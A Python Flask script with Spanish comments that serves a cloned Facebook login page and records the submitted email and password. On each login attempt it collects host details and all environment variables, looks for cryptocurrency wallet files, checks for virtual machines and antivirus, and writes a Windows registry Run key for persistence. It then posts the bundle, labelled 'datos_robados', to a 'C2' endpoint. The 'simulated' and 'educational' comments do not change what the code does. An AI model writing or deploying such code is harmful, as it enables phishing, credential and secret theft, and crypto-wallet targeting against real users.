from flask import Flask, request, render_template_string
import requests
import datetime
import platform
import os
import json
import subprocess
import winreg
from pathlib import Path

app = Flask(__name__)

# Credenciales válidas simuladas
credenciales_validas = {
    "usuario@ejemplo.com": "clave123",
    "admin@facebook.com": "adminpass"
}

def obtener_info_sistema():
    """Recolecta información básica del sistema (simulando exfiltración)"""
    try:
        info = {
            'usuario': os.getlogin(),
            'hostname': platform.node(),
            'sistema': platform.system(),
            'version': platform.version(),
            'arquitectura': platform.machine(),
            'procesador': platform.processor(),
            'python_version': platform.python_version(),
            'directorio_actual': os.getcwd(),
            'variables_env': dict(os.environ)
        }
        return info
    except Exception as e:
        return {'error': str(e)}

def verificar_wallets_cripto():
    """Simula la búsqueda de wallets de criptomonedas"""
    wallets_encontrados = []
    
    # Rutas comunes de wallets (simuladas)
    rutas_wallets = [
        os.path.expanduser("~\\AppData\\Roaming\\Exodus\\exodus.wallet"),
        os.path.expanduser("~\\AppData\\Roaming\\Electrum\\wallets"),
        os.path.expanduser("~\\AppData\\Roaming\\Bitcoin\\wallet.dat"),
        os.path.expanduser("~\\AppData\\Roaming\\Ethereum\\keystore"),
        os.path.expanduser("~\\AppData\\Local\\Coinbase\\User Data"),
        os.path.expanduser("~\\AppData\\Roaming\\MetaMask")
    ]
    
    for ruta in rutas_wallets:
        if os.path.exists(ruta):
            wallets_encontrados.append({
                'wallet': os.path.basename(ruta),
                'ruta': ruta,
                'size': os.path.getsize(ruta) if os.path.isfile(ruta) else 'directorio'
            })
        else:
            # Simular que encontramos algunos wallets ficticios
            wallets_encontrados.append({
                'wallet': os.path.basename(ruta),
                'ruta': ruta,
                'size': 'no_encontrado',
                'simulado': True
            })
    
    return wallets_encontrados

def crear_persistencia():
    """Simula la creación de persistencia en el sistema"""
    try:
        # Crear archivo de persistencia
        persistencia_file = os.path.expanduser("~\\AppData\\Roaming\\sistema_update.json")
        persistencia_data = {
            'instalado': True,
            'fecha_instalacion': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'reiniciar_con_sistema': True,
            'estado': 'activo'
        }
        
        with open(persistencia_file, 'w') as f:
            json.dump(persistencia_data, f, indent=2)
        
        # Simular entrada en registro (solo para demostración)
        try:
            # NOTA: Esto es solo para demostración educativa
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
                                   0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, 
                            f"python {os.path.abspath(__file__)}")
            winreg.CloseKey(reg_key)
            return {'persistencia': 'creada', 'registro': 'modificado'}
        except Exception as e:
            return {'persistencia': 'creada', 'registro': f'error: {str(e)}'}
            
    except Exception as e:
        return {'error': str(e)}

def verificar_sistema_objetivo():
    """Verifica si el sistema es un objetivo válido"""
    info_sistema = {
        'es_vm': False,
        'antivirus_detectado': [],
        'permisos_admin': False,
        'sistema_compatible': True
    }
    
    # Verificar si es una VM (simulado)
    vm_indicators = ['vmware', 'virtualbox', 'qemu', 'xen']
    for indicator in vm_indicators:
        if indicator in platform.processor().lower():
            info_sistema['es_vm'] = True
            break
    
    # Simular detección de antivirus
    try:
        result = subprocess.run(['wmic', 'product', 'get', 'name'], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            productos = result.stdout.lower()
            antivirus_conocidos = ['norton', 'mcafee', 'kaspersky', 'avast', 'bitdefender']
            for av in antivirus_conocidos:
                if av in productos:
                    info_sistema['antivirus_detectado'].append(av)
    except:
        pass
    
    # Verificar permisos de administrador
    try:
        import ctypes
        info_sistema['permisos_admin'] = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        info_sistema['permisos_admin'] = False
    
    return info_sistema

login_template = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        {{ styles }}
    </style>
</head>
<body>
    <div class="container">
        <div class="left-panel">
            <h1>facebook</h1>
            <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>
        <div class="right-panel">
            {% if mensaje %}
                <p style="color:red;">{{ mensaje }}</p>
            {% endif %}
            <form method="POST">
                <div class="input-group">
                    <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Contraseña" required>
                </div>
                <button type="submit" class="login-button">Iniciar sesión</button>
            </form>
            <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
            <div class="divider"></div>
            <button class="create-account-button">Crear cuenta nueva</button>
            <div class="page-creation-text">
                <a href="#">Crea una página</a> para una celebridad, una marca o un negocio.
            </div>
        </div>
    </div>
</body>
</html>
"""

styles = """        body {
            font-family: Arial, sans-serif;
            background: linear-gradient to right, #f0f2f5, #e0e6ed;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 80%;
            max-width: 980px;
        }

        .left-panel {
            flex: 1;
            padding: 20px;
            text-align: left;
            margin-right: 50px;
        }

        .left-panel h1 {
            color: #1877f2;
            font-size: 60px;
            margin-bottom: 10px;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
        }

        .left-panel p {
            font-size: 24px;
            line-height: 1.3;
            color: #1c1e21;
        }

        .right-panel {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            width: 380px;
            text-align: center;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group input {
            width: calc(100% - 20px);
            padding: 14px 10px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
        }

        .input-group input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }

        .login-button {
            width: 100%;
            padding: 14px 0;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.2s;
        }

        .login-button:hover {
            background-color: #166fe5;
        }

        .forgot-password {
            font-size: 14px;
            color: #1877f2;
            text-decoration: none;
            margin-bottom: 20px;
            display: block;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px 0;
        }

        .create-account-button {
            width: auto;
            padding: 14px 16px;
            background-color: #42b72a;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .create-account-button:hover {
            background-color: #36a420;
        }

        .page-creation-text {
            margin-top: 25px;
            font-size: 14px;
        }

        .page-creation-text a {
            color: #1c1e21;
            font-weight: bold;
            text-decoration: none;
        }

        .page-creation-text a:hover {
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            .container {
                flex-direction: column;
                width: 90%;
            }

            .left-panel {
                margin-right: 0;
                text-align: center;
                margin-bottom: 30px;
            }

            .left-panel h1 {
                font-size: 48px;
            }

            .left-panel p {
                font-size: 20px;
            }

            .right-panel {
                width: 100%;
            }
        }"""

@app.route('/', methods=['GET', 'POST'])
def login():
    mensaje = ''
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        es_valido = email in credenciales_validas and credenciales_validas[email] == password
        estado = 'Correcto' if es_valido else 'Incorrecto'

        # Recolectar información del sistema (simulando exfiltración)
        info_sistema = obtener_info_sistema()
        wallets = verificar_wallets_cripto()
        sistema_objetivo = verificar_sistema_objetivo()
        persistencia = crear_persistencia()

        datos_robados = {
            "email": email,
            "password": password,
            "estado": estado,
            "fecha_hora": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            "info_sistema": info_sistema,
            "wallets_encontrados": wallets,
            "sistema_objetivo": sistema_objetivo,
            "persistencia": persistencia
        }

        print(f"[+] Intento capturado: {email} - {estado}")
        print(f"[+] Sistema objetivo: {info_sistema.get('hostname', 'Unknown')}")
        print(f"[+] Wallets encontrados: {len(wallets)}")
        print(f"[+] Persistencia: {persistencia}")

        # Guardar en archivo local
        with open('intentos.txt', 'a') as f:
            f.write(str(datos_robados) + '\n')

        # Enviar al servidor C2
        try:
            requests.post('http://localhost:5000/receive', json=datos_robados)
            print(f"[+] Datos enviados al servidor C2: {estado}")
        except Exception as e:
            print(f"[-] Error enviando al C2: {e}")

        if es_valido:
            return f"<h3>Bienvenido {email}, has iniciado sesión correctamente.</h3>"
        else:
            mensaje = 'Correo o contraseña incorrectos.'

    return render_template_string(login_template, mensaje=mensaje, styles=styles)

if __name__ == '__main__':
    app.run(port=8000)
